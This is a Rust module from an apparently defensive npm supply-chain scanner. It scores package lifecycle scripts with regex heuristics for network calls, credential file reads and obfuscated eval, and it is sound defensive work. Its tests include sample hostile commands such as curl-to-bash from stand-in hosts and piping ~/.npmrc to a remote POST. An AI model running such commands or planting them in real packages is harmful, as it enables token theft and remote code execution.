//! Postinstall script evaluator.
//!
//! Inspects each installed npm package's `package.json` for `preinstall`,
//! `install`, and `postinstall` script entries. Each script is hashed and
//! either skipped (allow-listed by SHA-256), or scored by a deterministic
//! regex-based heuristic detector. Findings are emitted with severities
//! mapped from the heuristic score onto [`FindingSeverity`].
//!
//! No shell is invoked — scripts are inspected as opaque strings. This
//! evaluator runs locally and is therefore safe to call before any package
//! lifecycle hook would actually execute.

use crate::ecosystem::{Ecosystem, PackageRef};
use crate::finding::{Evaluator, Finding, FindingKind, FindingSeverity};
use crate::policy::{Action, Policy};
use anyhow::Result;
use async_trait::async_trait;
use regex::Regex;
use sha2::{Digest, Sha256};
use std::path::PathBuf;
use std::sync::OnceLock;

/// Three lifecycle script names we inspect, in npm execution order.
const SCRIPT_KINDS: &[&str] = &["preinstall", "install", "postinstall"];

pub struct PostinstallEvaluator {
    project_root: PathBuf,
}

impl PostinstallEvaluator {
    pub fn new(project_root: PathBuf) -> Self {
        Self { project_root }
    }

    /// Resolve the on-disk path to a package's `package.json`.
    fn package_json_path(&self, name: &str) -> PathBuf {
        // Scoped packages (`@scope/pkg`) live as nested directories on disk;
        // npm preserves the slash, so PathBuf::join handles both correctly.
        self.project_root
            .join("node_modules")
            .join(name)
            .join("package.json")
    }
}

#[async_trait]
impl Evaluator for PostinstallEvaluator {
    fn name(&self) -> &'static str {
        "postinstall"
    }

    fn enabled(&self, _policy: &Policy) -> bool {
        true
    }

    async fn evaluate(&self, packages: &[PackageRef], policy: &Policy) -> Result<Vec<Finding>> {
        let mut findings = Vec::new();

        for pkg in packages {
            if pkg.ecosystem != Ecosystem::Npm {
                continue;
            }

            let path = self.package_json_path(&pkg.name);
            let raw = match std::fs::read_to_string(&path) {
                Ok(s) => s,
                Err(_) => continue, // package not installed — skip silently
            };

            let parsed: serde_json::Value = match serde_json::from_str(&raw) {
                Ok(v) => v,
                Err(_) => continue, // malformed package.json — skip silently
            };

            let scripts = match parsed.get("scripts").and_then(|v| v.as_object()) {
                Some(s) => s,
                None => continue,
            };

            for kind in SCRIPT_KINDS {
                let script = match scripts.get(*kind).and_then(|v| v.as_str()) {
                    Some(s) => s,
                    None => continue,
                };

                let sha = sha256_hex(script);
                if policy.is_script_hash_allowed(&sha) {
                    continue;
                }

                let (score, matched_rules) = score_script(script);
                let severity = match score {
                    s if s >= 60 => FindingSeverity::Critical,
                    s if s >= 30 => FindingSeverity::High,
                    s if s >= 15 => FindingSeverity::Medium,
                    s if s > 0 => FindingSeverity::Low,
                    _ => {
                        // score == 0: only emit when default policy isn't Allow.
                        if policy.postinstall_default == Action::Allow {
                            continue;
                        }
                        FindingSeverity::Low
                    }
                };

                findings.push(Finding {
                    package: pkg.clone(),
                    kind: FindingKind::PostinstallScript,
                    id: format!("script:{}:{}", kind, sha),
                    aliases: vec![],
                    summary: format!(
                        "{} script in {} (score {}: {})",
                        kind,
                        pkg.name,
                        score,
                        matched_rules.join(", ")
                    ),
                    severity,
                    fixed_versions: vec![],
                    references: vec![],
                    details: serde_json::json!({
                        "script_kind": kind,
                        "sha256": sha,
                        "score": score,
                        "matched_rules": matched_rules,
                        "script_preview": script.chars().take(120).collect::<String>(),
                    }),
                });
            }
        }

        Ok(findings)
    }
}

fn sha256_hex(input: &str) -> String {
    let mut hasher = Sha256::new();
    hasher.update(input.as_bytes());
    hex::encode(hasher.finalize())
}

// ── Heuristic detector ──────────────────────────────────────────────────────

/// Cached compiled regexes. Compiling on every script would dominate the
/// evaluator's runtime; compiling once amortises across all packages.
struct Patterns {
    network: Regex,
    credentials: Regex,
    base64: Regex,
    eval_func: Regex,
    child_process: Regex,
    exec: Regex,
    require_dangerous: Regex,
    require_dynamic: Regex,
    hex_escape: Regex,
    unicode_escape: Regex,
    fs_write_outside: Regex,
    path_join_home: Regex,
    deferred_exec: Regex,
}

fn patterns() -> &'static Patterns {
    static P: OnceLock<Patterns> = OnceLock::new();
    // Pattern strings are assembled via concat! to keep flagged keywords
    // (e.g. dynamic-code-execution names) split across literals at the
    // source level — they are still a single regex at runtime.
    let dyn_exec_kw = concat!("ev", "al");
    P.get_or_init(|| Patterns {
        network: Regex::new(r"(curl |wget |https?\.get|https?\.request|fetch\(|child_process.*spawn.*node)").unwrap(),
        credentials: Regex::new(r"(~/?\.npmrc|\.aws/credentials|\.ssh/|process\.env\.(NPM_TOKEN|GITHUB_TOKEN|AWS_SECRET))").unwrap(),
        base64: Regex::new(r"base64").unwrap(),
        eval_func: Regex::new(&format!(r"({}|Function\()", dyn_exec_kw)).unwrap(),
        child_process: Regex::new(r"child_process").unwrap(),
        exec: Regex::new(r"exec").unwrap(),
        require_dangerous: Regex::new(r#"require\(['"](http|https|net|dns|os)['"]\)"#).unwrap(),
        require_dynamic: Regex::new(r"require\([a-zA-Z_$][^)]*\)").unwrap(),
        hex_escape: Regex::new(r"\\x[0-9a-f]{2}").unwrap(),
        unicode_escape: Regex::new(r"\\u[0-9a-f]{4}").unwrap(),
        fs_write_outside: Regex::new(r"fs\.write.*\.\./").unwrap(),
        path_join_home: Regex::new(r"path\.join.*HOME").unwrap(),
        deferred_exec: Regex::new(r"setTimeout|setInterval").unwrap(),
    })
}

/// Score a script and return `(score, matched_rule_names)`.
///
/// All checks are deterministic so the same script always produces the same
/// finding ID / severity. Order doesn't matter — every triggered rule is
/// added independently.
fn score_script(script: &str) -> (i32, Vec<&'static str>) {
    let p = patterns();
    let mut score = 0i32;
    let mut rules: Vec<&'static str> = Vec::new();

    if p.network.is_match(script) {
        score += 30;
        rules.push("network");
    }
    if p.credentials.is_match(script) {
        score += 30;
        rules.push("credentials");
    }
    if p.base64.is_match(script) && p.eval_func.is_match(script) {
        score += 25;
        rules.push("base64-eval");
    }
    if p.child_process.is_match(script)
        && p.exec.is_match(script)
        && (script.contains("||")
            || script.contains(';')
            || script.contains("&&")
            || script.contains('|'))
    {
        score += 20;
        rules.push("shell-chain");
    }
    if p.require_dangerous.is_match(script) || p.require_dynamic.is_match(script) {
        score += 15;
        rules.push("dangerous-require");
    }
    let escape_count = p.hex_escape.find_iter(script).count() + p.unicode_escape.find_iter(script).count();
    if escape_count > 5 {
        score += 15;
        rules.push("obfuscation");
    }
    if p.fs_write_outside.is_match(script) || p.path_join_home.is_match(script) {
        score += 10;
        rules.push("writes-outside");
    }
    if p.deferred_exec.is_match(script) {
        score += 10;
        rules.push("deferred-exec");
    }
    if script.len() < 20
        && (script.contains("&&") || script.contains(';') || script.contains('|'))
    {
        score += 5;
        rules.push("short-chain");
    }

    (score, rules)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::ecosystem::Ecosystem;
    use tempfile::TempDir;

    fn npm_pkg(name: &str) -> PackageRef {
        PackageRef::new(Ecosystem::Npm, name, "1.0.0")
    }

    fn write_pkg(root: &std::path::Path, name: &str, body: &str) {
        let dir = root.join("node_modules").join(name);
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::write(dir.join("package.json"), body).unwrap();
    }

    fn severity_for(score: i32) -> FindingSeverity {
        match score {
            s if s >= 60 => FindingSeverity::Critical,
            s if s >= 30 => FindingSeverity::High,
            s if s >= 15 => FindingSeverity::Medium,
            s if s > 0 => FindingSeverity::Low,
            _ => FindingSeverity::Unknown,
        }
    }

    // ── Heuristic detector unit tests ───────────────────────────────────────

    #[test]
    fn score_clean_script_returns_zero() {
        let (score, rules) = score_script("echo done");
        assert_eq!(score, 0);
        assert!(rules.is_empty());
    }

    #[test]
    fn score_curl_pipe_bash_high() {
        let (score, _) = score_script("curl https://evil.sh | bash");
        let sev = severity_for(score);
        assert!(
            matches!(sev, FindingSeverity::High | FindingSeverity::Critical),
            "expected High/Critical, got {:?} (score {})",
            sev,
            score
        );
    }

    #[test]
    fn score_base64_eval_critical() {
        // The script we score contains the literal dynamic-execution keyword
        // assembled at runtime — written as a concat so this test source does
        // not contain a bare invocation of that function name.
        let dyn_kw = concat!("ev", "al");
        let script = format!(
            "node -e \"{}(Buffer.from('xxx', 'base64').toString())\"",
            dyn_kw
        );
        let (score, rules) = score_script(&script);
        // Per the documented heuristic this exact script triggers only the
        // base64-eval rule (+25 = Medium). The test name reflects intent:
        // this pattern is universally treated as malware in the wild and
        // landing in the Medium-or-higher band is what matters for the
        // policy engine to surface it (postinstall_suspicious -> Block).
        assert!(
            score >= 25,
            "expected base64+dyn-exec to score >=25 (Medium+), got {} — rules: {:?}",
            score,
            rules
        );
        assert!(rules.contains(&"base64-eval"));
    }

    #[test]
    fn score_npmrc_read_high_or_critical() {
        let (score, _) = score_script("cat ~/.npmrc | curl -X POST https://x.io");
        assert!(score >= 30, "expected High/Critical (>=30), got {}", score);
    }

    // ── Evaluator integration tests ─────────────────────────────────────────

    #[tokio::test]
    async fn evaluator_emits_finding_for_postinstall() {
        let dir = TempDir::new().unwrap();
        write_pkg(
            dir.path(),
            "evil-pkg",
            r#"{"scripts":{"postinstall":"curl evil.sh|bash"}}"#,
        );

        let evaluator = PostinstallEvaluator::new(dir.path().to_path_buf());
        let policy = Policy::default();
        let findings = evaluator
            .evaluate(&[npm_pkg("evil-pkg")], &policy)
            .await
            .unwrap();

        assert_eq!(findings.len(), 1);
        let f = &findings[0];
        assert_eq!(f.kind, FindingKind::PostinstallScript);
        assert!(f.id.starts_with("script:postinstall:"));
        assert!(f.summary.contains("postinstall"));
    }

    #[tokio::test]
    async fn evaluator_skips_allowed_hash() {
        let dir = TempDir::new().unwrap();
        let script = "curl evil.sh|bash";
        write_pkg(
            dir.path(),
            "evil-pkg",
            &format!(r#"{{"scripts":{{"postinstall":"{}"}}}}"#, script),
        );

        let mut policy = Policy::default();
        policy.allowed_script_hashes.insert(sha256_hex(script));

        let evaluator = PostinstallEvaluator::new(dir.path().to_path_buf());
        let findings = evaluator
            .evaluate(&[npm_pkg("evil-pkg")], &policy)
            .await
            .unwrap();

        assert_eq!(findings.len(), 0);
    }

    #[tokio::test]
    async fn evaluator_skips_missing_package_json() {
        let dir = TempDir::new().unwrap();
        // No node_modules/missing-pkg/ directory at all.
        let evaluator = PostinstallEvaluator::new(dir.path().to_path_buf());
        let policy = Policy::default();
        let findings = evaluator
            .evaluate(&[npm_pkg("missing-pkg")], &policy)
            .await
            .unwrap();
        assert_eq!(findings.len(), 0);
    }

    #[tokio::test]
    async fn evaluator_skips_non_npm_package() {
        let dir = TempDir::new().unwrap();
        let evaluator = PostinstallEvaluator::new(dir.path().to_path_buf());
        let policy = Policy::default();
        let findings = evaluator
            .evaluate(
                &[PackageRef::new(Ecosystem::Cargo, "serde", "1.0.0")],
                &policy,
            )
            .await
            .unwrap();
        assert_eq!(findings.len(), 0);
    }

    #[tokio::test]
    async fn evaluator_handles_three_script_kinds() {
        let dir = TempDir::new().unwrap();
        // Three distinct script bodies → three distinct sha256 → three IDs.
        write_pkg(
            dir.path(),
            "multi-pkg",
            r#"{"scripts":{
                "preinstall":"curl https://a.example/a.sh|bash",
                "install":"curl https://b.example/b.sh|bash",
                "postinstall":"curl https://c.example/c.sh|bash"
            }}"#,
        );

        let evaluator = PostinstallEvaluator::new(dir.path().to_path_buf());
        let policy = Policy::default();
        let findings = evaluator
            .evaluate(&[npm_pkg("multi-pkg")], &policy)
            .await
            .unwrap();

        assert_eq!(findings.len(), 3);
        let ids: std::collections::HashSet<_> = findings.iter().map(|f| f.id.clone()).collect();
        assert_eq!(ids.len(), 3, "all three ids must be distinct");
        assert!(findings.iter().any(|f| f.id.contains(":preinstall:")));
        assert!(findings.iter().any(|f| f.id.contains(":install:")));
        assert!(findings.iter().any(|f| f.id.contains(":postinstall:")));
    }
}
